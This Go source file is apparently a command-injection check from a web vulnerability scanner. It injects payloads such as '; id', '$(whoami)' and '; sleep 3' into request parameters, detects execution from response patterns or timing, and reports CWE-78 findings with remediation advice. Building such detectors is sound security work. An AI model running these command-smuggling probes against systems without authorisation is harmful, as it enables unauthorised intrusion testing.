package modules

import (
	"fmt"
	"nightfalllx/pkg/client"
	"regexp"
	"strings"
	"time"
)

type CMDiModule struct{}

func NewCMDiModule() *CMDiModule {
	return &CMDiModule{}
}

func (m *CMDiModule) Name() string {
	return "cmdi"
}

func (m *CMDiModule) Description() string {
	return "Harmless OS Command Injection verification (safe id/whoami and timing probes)"
}

var (
	idPattern     = regexp.MustCompile(`uid=\d+\([^)]+\)`)
	whoamiPattern = regexp.MustCompile(`(?m)^(?:root|www-data|nginx|apache|nobody|vapf|ubuntu|daemon)$`)
)

var cmdiProbes = []struct {
	Label   string
	Payload string
	Pattern *regexp.Regexp
}{
	{"id", "; id", idPattern},
	{"whoami", "| whoami", whoamiPattern},
	{"id", "&& id", idPattern},
	{"whoami", "&& whoami", whoamiPattern},
	{"id", "$(id)", idPattern},
	{"whoami", "$(whoami)", whoamiPattern},
	{"id", "`id`", idPattern},
	{"whoami", "`whoami`", whoamiPattern},
}

func (m *CMDiModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	for _, param := range target.Parameters() {
		// Output-based check
		for _, probe := range cmdiProbes {
			var resp *client.Response
			var err error
			if isPost {
				resp, err = c.Request("POST", target.URL, target.BuildDataWithParam(param, probe.Payload), nil)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, probe.Payload), "", nil)
			}
			if err != nil || resp.Body == "" {
				continue
			}

			if probe.Pattern.MatchString(resp.Body) {
				findings = append(findings, &Finding{
					Module:      m.Name(),
					Title:       "OS Command Injection (Safe PoC)",
					Severity:    SeverityCritical,
					Confidence:  100,
					URL:         target.URL,
					Parameter:   param,
					Payload:     probe.Payload,
					Detail:      fmt.Sprintf("Confirmed arbitrary command execution using harmless probe '%s'.", probe.Payload),
					Evidence:    fmt.Sprintf("Matched system user pattern in response body: %s", probe.Label),
					Remediation: "Avoid shell execution with request-controlled inputs. Use safe system APIs without shell invocation.",
					CWEID:       78,
				})
				break
			}
		}

		if len(findings) > 0 {
			continue
		}

		// Time-based check (safe 3-second sleep)
		origVal := target.Params[param]
		if isPost {
			origVal = target.Data[param]
		}
		if origVal == "" {
			origVal = "1"
		}

		// Measure baseline latency
		start := time.Now()
		var baseErr error
		if isPost {
			_, baseErr = c.Request("POST", target.URL, target.BuildDataWithParam(param, origVal), nil)
		} else {
			_, baseErr = c.Request("GET", target.BuildURLWithParam(param, origVal), "", nil)
		}
		if baseErr != nil {
			continue
		}
		baseLatency := time.Since(start)

		sleepDelay := 3 * time.Second
		sleepPayloads := []string{
			fmt.Sprintf("; sleep %d", 3),
			fmt.Sprintf("| sleep %d", 3),
			fmt.Sprintf("&& sleep %d", 3),
		}

		for _, sPayload := range sleepPayloads {
			start = time.Now()
			var sErr error
			if isPost {
				_, sErr = c.Request("POST", target.URL, target.BuildDataWithParam(param, sPayload), nil)
			} else {
				_, sErr = c.Request("GET", target.BuildURLWithParam(param, sPayload), "", nil)
			}
			if sErr != nil {
				continue
			}
			sLatency := time.Since(start)

			if sLatency >= baseLatency+(sleepDelay*8/10) {
				findings = append(findings, &Finding{
					Module:      m.Name(),
					Title:       "Blind OS Command Injection (Time-based)",
					Severity:    SeverityCritical,
					Confidence:  90,
					URL:         target.URL,
					Parameter:   param,
					Payload:     sPayload,
					Detail:      fmt.Sprintf("Confirmed time-based command injection: baseline latency=%v, injection latency=%v.", baseLatency.Round(time.Millisecond), sLatency.Round(time.Millisecond)),
					Evidence:    fmt.Sprintf("Sleep payload %s delayed response by %v", sPayload, sLatency.Round(time.Millisecond)),
					Remediation: "Avoid system shell invocation; use parameterized APIs.",
					CWEID:       78,
				})
				break
			}
		}
	}

	return findings, nil
}
